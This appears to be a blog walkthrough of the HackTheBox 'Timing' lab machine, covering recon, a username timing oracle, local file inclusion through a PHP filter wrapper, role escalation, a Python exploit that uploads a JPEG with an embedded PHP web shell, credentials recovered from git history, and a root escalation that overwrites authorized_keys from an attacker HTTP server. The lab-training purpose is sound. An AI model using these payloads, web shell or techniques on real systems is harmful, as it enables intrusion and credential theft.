---
title: "HackTheBox - Timing"
published: 2022-06-05T12:00:00-04:00
updated: 2022-06-05T12:00:00-04:00
image: /assets/img/timing2.png
categories:
  - writeup
tags:
  - hackthebox
  - linux
  - web
  - exploit
summary: The Timing machine on HTB has some interesting web exploitation paths that reminded me of the OSCP and OSWE course labs. The intended path involves a Local File Inclusion (LFI) vulnerability combined with a File Upload function...
---

The **Timing** machine on [HTB](https://www.hackthebox.com/) has some interesting web exploitation paths that reminded me of the OSCP and OSWE course labs. The intended path involves a **Local File Inclusion (LFI)** vulnerability combined with a **File Upload** function that is only accessible after **upgrading our user account**.

I have tried to describe my approach along with the solutions. I usually find that to be more useful for learning than a solution without context.

- [Network Recon](#network-recon)
- [HTTP Server on Port 80](#http-server-on-port-80)
- [Login Path 1 Username Exists Oracle](#login-path-1-username-exists-oracle)
- [Login Path 2 Local File Inclusion](#login-path-2-local-file-inclusion)
    - [PHP Wrapper](#php-wrapper)
- [Webapp Privesc](#webapp-privesc)
- [Remote Code Execution](#remote-code-execution)
- [User Shell](#user-shell)
- [Root](#root)

## Network Recon

A thorough nmap scan reveals only two open TCP ports (output abridged):

```bash
$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.11.135
$ nmap -vv --reason -Pn -T4 -sU -A --top-ports 100 10.10.11.135
```
```text
PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Simple WebApp
|_Requested resource was ./login.php
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)

Aggressive OS guesses: Linux 4.15 - 5.6 (94%), Linux 5.3 - 5.4 (94%)
```

The target machine appears to be an Ubuntu Linux installation.

The open ports are:

* TCP/22 -- SSH
* TCP/80 -- HTTP

Associated with those we find two service banners:

* OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
* Apache httpd 2.4.29 ((Ubuntu))

When we search for these using `searchsploit` or [exploitDB](https://www.exploit-db.com/), then we only find a possible Username Enumeration vulnerability for `OpenSSH 2.3 < 7.7` (CVE-2018-15473). But this particular version appears to not be vulnerable. Metasploit's `scanner/ssh/ssh_enumusers` module only finds false positives.


The only other noteworthy information at this stage is that the SSH server supports both password and public key logins:

```bash
$ nmap -vv --reason -Pn -T4 -sV -p 22 --script="banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" 10.10.11.135
# ...
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
```

## HTTP Server on Port 80

When we visit the web server, then we get redirected to a login (PHP) page.

![Timing Login interface](/assets/img/timing_10_login.png)

I checked for SQL and NoSQL injections, but did not find anything obvious.


[Feroxbuster](https://github.com/epi052/feroxbuster) discovers some other files and directories:

```text
$ feroxbuster -u http://10.10.11.135/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -e

302      GET        0l        0w        0c http://10.10.11.135/ => ./login.php
301      GET        9l       28w      310c http://10.10.11.135/css => http://10.10.11.135/css/
200      GET      115l      264w     3937c http://10.10.11.135/footer.php
302      GET        0l        0w        0c http://10.10.11.135/header.php => ./login.php
200      GET        0l        0w        0c http://10.10.11.135/image.php
301      GET        9l       28w      313c http://10.10.11.135/images => http://10.10.11.135/images/
302      GET        0l        0w        0c http://10.10.11.135/index.php => ./login.php
301      GET        9l       28w      309c http://10.10.11.135/js => http://10.10.11.135/js/
200      GET        6l      458w    39680c http://10.10.11.135/js/bootstrap.min.js
200      GET        2l     1297w    89476c http://10.10.11.135/js/jquery.min.js
200      GET        6l     1460w   121457c http://10.10.11.135/css/bootstrap.min.css
200      GET      278l      561w     5425c http://10.10.11.135/css/login.css
302      GET        0l        0w        0c http://10.10.11.135/logout.php => ./login.php
200      GET      177l      374w     5609c http://10.10.11.135/login.php
200      GET      214l      960w    38616c http://10.10.11.135/images/user-icon.png
302      GET        0l        0w        0c http://10.10.11.135/profile.php => ./login.php
302      GET        0l        0w        0c http://10.10.11.135/upload.php => ./login.php
200      GET        0l        0w        0c http://10.10.11.135/db_conn.php
302      GET        0l        0w        0c http://10.10.11.135/profile_update.php => ./login.php
```

## Login Path 1 Username Exists Oracle

You can skip this part and go straight to [Path 2 (LFI)](#login-path-2-local-file-inclusion). The LFI will be required later on to gain a shell anyway, but I thought the Username Oracle path is pretty interesting as well.

---

The first thing I noticed when I looked at the website with Burp was a username oracle in the login interface. I found this when I tried to log in with the common username `admin`, which happens to actually exist.

If a username exists, then the response time will be noticably long. In turn a login attempt with a non-existent username will cause an almost instant response. 

This vulnerability is usually caused by the time required to calculate the hash for the input password, so it can be compared to the password hash in the database. If a secure algorithm is used, then this calculation will cause a noticable delay. This makes cracking the stored password hash more time intensive for an attacker, but also creates a username oracle if the developer does not account for it in their login procedure.

If you have **Burp Professional** (or Burp Community and a lot of time), then you can use **Burp Intruder** and a username wordlist in order to find other existing usernames. 


![Burp Intruder positions](/assets/img/timing_14_intruder.png)

Enable the column for Response Times ("Response Received") in the output window.

![Burp Intruder results](/assets/img/timing_15_intruder.png)

In this example the oracle is very pronounced with over one second delay for correct usernames.

User 'aaron' does not like to remember complicated passwords. The password is also 'aaron'.

## Login Path 2 Local File Inclusion


Previously we found some PHP files with Feroxbuster that are publicly accessible and do not redirect to `login.php`:

* footer.php
* image.php
* db_conn.php

Sadly navigating to these files does not generate any useful output. The footer file is probably just a template for the website footer. But the other two files look interesting.

My assumption was that `image.php` is probably used to load image files. Sadly just browsing the site (unauthenticated) did not show any examples of this PHP file being used in Burp.

Since I did not find any other leads I fuzzed for URL parameters with FFUF.

We are looking for two unknowns, the parameter key and a parameter value that produces an unusual output:

```text
/image.php?<key>=<value>
```

E.g. something like this:

```text
/image.php?file=some_image.jpg
```


Taken from burp, I saved the following HTTP request as `request.txt`:

```text
GET /image.php?FUZZ=FU2Z HTTP/1.1
Host: 10.10.11.135
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=on3t12dp0tb8kr8l15k83qqag7
Upgrade-Insecure-Requests: 1


```

And created the following [FFUF config](https://github.com/ffuf/ffuf/blob/master/ffufrc.example) as `config.ffuf`:

```
[input]
    request = "request.txt"
    requestproto = "http"

[http]
    proxyurl = "http://127.0.0.1:8080"

[general]
    colors = true
    verbose = true
    delay = ""
    maxtime = 0
    maxtimejob = 0
    quiet = false
    rate = 0
    stopon403 = false
    stoponall = false
    stoponerrors = false
    threads = 10

[output]
    debuglog = "debug.log"
    outputfile = "output.json"
    outputformat = "json"
    outputcreateemptyfile = false

[matcher]
    status = "all"

[filter]
    size = "0"
```

Note that I set Burp as proxy `http://127.0.0.1:8080`, so I can see the requests and responses later in Burp's history. Make sure Burp is actually running.

[Seclists](https://github.com/danielmiessler/SecLists) has some wordlists for fuzzing. I used the following for the parameter key:

* `/usr/share/seclists/Discovery/Web-Content/api/objects.txt`

I also made a small LFI wordlist myself `lfi_linux_small.txt` for the parameter value:

```text
/etc/passwd
/etc/shadow
/etc/crontab
/etc/bashrc
/etc/groups
/etc/hosts
/proc/self/environ
../../../../etc/shadow
../../../../etc/crontab
../../../../etc/bashrc
../../../../etc/groups
../../../../etc/hosts
../../../../proc/self/environ
```

Finally the terminal command looks like this then:

```bash
$ ffuf -config ./config.ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt:FUZZ -w ./lfi_linux_small.txt:FU2Z

#...
[Status: 200, Size: 25, Words: 3, Lines: 1]
| URL | http://10.10.11.135/image.php?img=/etc/passwd
    * FU2Z: /etc/passwd
    * FUZZ: img

[Status: 200, Size: 25, Words: 3, Lines: 1]
| URL | http://10.10.11.135/image.php?img=/etc/shadow
    * FUZZ: img
    * FU2Z: /etc/shadow
#...
```

A working parameter is quickly found:

```text
http://10.10.11.135/image.php?img=/etc/passwd
http://10.10.11.135/image.php?img=../../../etc/passwd
```

The response body will contain the text:

```text
Hacking attempt detected!
```

I tried using this parameter as it was probably intended to be used. Here with the image file from the login page:

```text
http://10.10.11.135/image.php?img=./images/user-icon.png
```

This printed the binary blob of the image file. So it seems we actually have a local file inclusion (LFI) at our hands.

The only hurdle now is the input filter that produces the error output: `Hacking attempt detected!`.

#### PHP Wrapper

[PayloadAllTheThings has a cheatsheet for PHP Wrappers](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers).

The following PHP Wrapper ended up working:

```text
http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
```

![PHP Wrapper LFI](/assets/img/timing_30_lfi_wrapper.png)

This will print the file content as base64. Burp's Decoder can turn that back into the proper cleartext:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

I tried logging into the website as `aaron` with password `aaron` and was rewarded with:

```text
You are logged in as user 2!
```

## Webapp Privesc

Once we are logged in we can change our profile details.

When we capture this request in Burp, then we can see an interesting response. The response JSON object has more fields than the ones we overwrote. One of them is `"role": "0"` which probably indicates user rights.

![Parameter polution](/assets/img/timing_40_profile_update.png)

After including `&rule=1` in the request our session gets upgraded to an admin user.

```text
POST /profile_update.php HTTP/1.1
Host: 10.10.11.135
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.135/profile.php
Content-type: application/x-www-form-urlencoded
Content-Length: 59
Origin: http://10.10.11.135
Connection: close
Cookie: PHPSESSID=b4kjobo81eummgl8sm0mig5ltu

firstName=test&lastName=test&email=test&company=test&role=1
```

Once we are admin, we can upload a profile picture.


## Remote Code Execution

The file upload function allows us to upload `.jpg` or `.pdf` files only. I tried uploading an image, but I could not find the resulting image in the `/images/` directory.

In order to whitebox analyze this app I downloaded the following php files with the LFI:

```text
http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php
http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=image.php
```

In the `upload.php` file is the following code:

```php
<?php
// ...
// upload.php
$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
// ...
```

So presumably the resulting file will be in `images/uploads/` and the filename would be:

```php
md5( uniqid() . time() ) . '_' . 'example.jpg'
```

E.g. `2e47a134b2def213d5453367e030a09f_example.jpg`

* `uniqid()` -- generates a hex representation of the current UNIX timestamp (microsecond precision)
* `time()` -- generates the current UNIX timestamp as integer (only seconds precision)
* `md5()` -- creates an md5 hash

So all parts of this filename are predictable. Only the inclusion of microseconds could force us to use a large number of requests to find the right filename.

But there is actually a bug in this code that is easy to overlook:

`'$file_hash'` is hardcoded as a string, instead of using the actual value of the variable `$file_hash`. So in effect we only have to guess the correct second.

In summary, the filename will be:

```php
md5( '$file_hash' . time() ) . '_' . 'example.jpg'
```

With this we will only need to check the current second plus/minus a few seconds to compensate for clock skew and response time.

Now that we have figured out how to find the uploaded file, how do we smuggle in some PHP code? 

Important is that the image file needs to have the `.jpg` extension and needs to pass `getimagesize()` or the file will be rejected:

```php
<?php
// upload.php
// ...
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
// ...
if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}
//...
$check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
if ($check === false) {
    $error = "Invalid file";
}
// ...
```

These bars not very high. We can just append some PHP code to a valid JPEG file.

For example this would work in attaching PHP code to a valid image file `example.jpg`:

```bash
echo "<?php phpinfo() ?>" >> example.jpg
```

After uploading this and guessing the correct filename we would see the output of the `phpinfo()` function.

But it is a better idea to use a proper Python script to manipulate the jpg file before it is uploaded.

I hacked together an exploit that uploads a JPEG with an attached webshell, finds the right filename and then opens a pseudo shell. 

```python
#!/usr/bin/env python3
# HTB Timing - Authenticated RCE
__author__ = "oats"
import time
import math
import hashlib
import requests
import sys
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib
import re

proxies = {
   #'http': 'http://127.0.0.1:8080' # comment back in for burp
}

def phptime():
    m = time.time()
    return math.floor(m)

def md5(inp_str):
    return hashlib.md5(inp_str.encode()).hexdigest()

def upload(url, filename, cookie, payload):
    test = open(filename, 'rb')
    a = test.read()
    a += b"\n"
    a += payload
    test.close()

    multipart_data = MultipartEncoder(
        fields = {
            'fileToUpload': (filename, a, 'image/jpeg')
            }
    )
    headers = {
        'Content-Type': multipart_data.content_type,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0', 
        'Cookie': cookie
    }
    response = requests.post(url, data=multipart_data, headers=headers, proxies=proxies)

    if "The file has been uploaded." in response.text:
        print("[+] SUCCESSFULLY UPLOADED")
    else:
        print("[-] FAILED UPLOAD")
        sys.exit(1)

    return response

def figure_filename(m, filename):
    hash = md5( '$file_hash' + str(m) )
    created_filename = f"{hash}_{filename}"
    return created_filename

def pseudo_shell(url):
    response_reg = r'<pre>([\s\S]*)\n</pre>' # anyting between pre tags
    print("[+] Starting pseudo shell. Type 'exit' to exit")
    while True:
        inp = input("> ")
        if inp == 'exit':
            break
        elif inp == "":
            continue

        encoded = urllib.parse.quote(inp)
        response = requests.get(url + "&cmd=" + encoded)
        received = response.text

        matchObj = re.search( response_reg, received, re.M|re.I)
        if(matchObj):
            print(matchObj.group(1))
        else:
            print("[failed] received length:", len(received))
    print("Exiting...")

if len(sys.argv) < 4:
    print("Missing parameters: python3 exploit.py <target> <session_admin> <file_jpg>")
    sys.exit(1)

host = sys.argv[1]
cookie = sys.argv[2]
filename = sys.argv[3]
payload = b"<?php echo '<h1>use &cmd=</h1><pre>' . shell_exec(urldecode($_GET['cmd'])) . '</pre>';?>"

target = f"http://{host}"
url_upload = f"{target}/upload.php"
url_lfi = f"{target}/image.php?img=./images/uploads/"

# upload file
response_upload = upload(url_upload, filename, cookie, payload)

# find correct url
url_webshell = None
timestamp = phptime()

for iterator in range(-2, 10):
    possible_filename = figure_filename(timestamp + iterator, filename)
    possible_url = url_lfi + possible_filename
    check_res = requests.get(possible_url)
    response_size = len(check_res.text)
    
    print(iterator, possible_url, check_res, response_size)

    if response_size > 0:
        print("[+] FOUND!!!")
        url_webshell = possible_url
        break

if not url_webshell:
    print("[-] Did not find a working url. Increase range on very slow connections.")
    sys.exit(1)

# start webshell handler
pseudo_shell(url_webshell)
```

The session string needs to be for an upgraded account.

```bash
$ python3 exploit.py 10.10.11.135 'PHPSESSID=gbdbhroavkbgihookd36f4ikns' smile.jpg
```

![Pseudo Shell](/assets/img/timing_63_pseudo_shell.png)


## User Shell

The database file for the webapp contains MySQL credentials:

```bash
> cat /var/www/html/db_conn.php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

Sadly the database does not contain anything useful and that password is not re-used elsewhere.

But there is a backup of the webapp in `/opt/source-files-backup.zip`.

Unzip it to `/tmp/` and you will find a `.git` repository directory.

```bash
> mkdir /tmp/blub
> unzip /opt/source-files-backup.zip -d /tmp/blub
>
> ls -al /tmp/blub/backup
total 76
drwxr-xr-x 6 www-data www-data 4096 Jul 20  2021 .
drwxr-xr-x 3 www-data www-data 4096 Apr 25 19:45 ..
drwxr-xr-x 8 www-data www-data 4096 Jul 20  2021 .git
-rw-r--r-- 1 www-data www-data  200 Jul 20  2021 admin_auth_check.php
-rw-r--r-- 1 www-data www-data  373 Jul 20  2021 auth_check.php
-rw-r--r-- 1 www-data www-data 1268 Jul 20  2021 avatar_uploader.php
drwxr-xr-x 2 www-data www-data 4096 Jul 20  2021 css
-rw-r--r-- 1 www-data www-data   92 Jul 20  2021 db_conn.php
-rw-r--r-- 1 www-data www-data 3937 Jul 20  2021 footer.php
-rw-r--r-- 1 www-data www-data 1498 Jul 20  2021 header.php
-rw-r--r-- 1 www-data www-data  507 Jul 20  2021 image.php
drwxr-xr-x 3 www-data www-data 4096 Jul 20  2021 images
-rw-r--r-- 1 www-data www-data  188 Jul 20  2021 index.php
drwxr-xr-x 2 www-data www-data 4096 Jul 20  2021 js
-rw-r--r-- 1 www-data www-data 2074 Jul 20  2021 login.php
-rw-r--r-- 1 www-data www-data  113 Jul 20  2021 logout.php
-rw-r--r-- 1 www-data www-data 3041 Jul 20  2021 profile.php
-rw-r--r-- 1 www-data www-data 1740 Jul 20  2021 profile_update.php
-rw-r--r-- 1 www-data www-data  984 Jul 20  2021 upload.php
```

The commit log shows an interesting entry about an update in `db_conn.php`:

```bash
> git --no-pager -C /tmp/blub/backup log

commit 16de2698b5b122c93461298eab730d00273bd83e
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

commit e4e214696159a25c69812571c8214d2bf8736a3f
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:33:54 2021 +0000

    init
```

Restore the previous commit and you will find a different password in the file:

```bash
> git --no-pager -C /tmp/blub/backup checkout e4e214696159a25c69812571c8214d2bf8736a3f
>
> cat /tmp/blub/backup/db_conn.php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
```

This is also the SSH password for user `aaron`.

```bash
$ ssh aaron@10.10.11.135
password: S3cr3t_unGu3ss4bl3_p422w0Rd
```

## Root

The Privilege Escalation is rather straight forward.

```bash
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/ur/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```

`sudo /usr/bin/netutils` allows you to download a file into the current working directory with root permissions.

On your own machine generate private and public SSH keys:

```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa
```

Rename the public key to some custom name.

```bash
mv id_rsa.pub muesli
```

Start an http server in the directory where your keys are located.

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

On the target create a symbolic link to root's authorized_keys file with the same name as your renamed public key.

```bash
aaron@timing:~$ ln -s /root/.ssh/authorized_keys muesli
```

Use netutils to overwrite the symlink filename with your public key.

```bash
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://<yourip>/muesli
```

The root file will be overwritten and you can sign in as root via SSH with your generated private key.

```bash
ssh root@10.10.11.135 -i ./id_rsa
```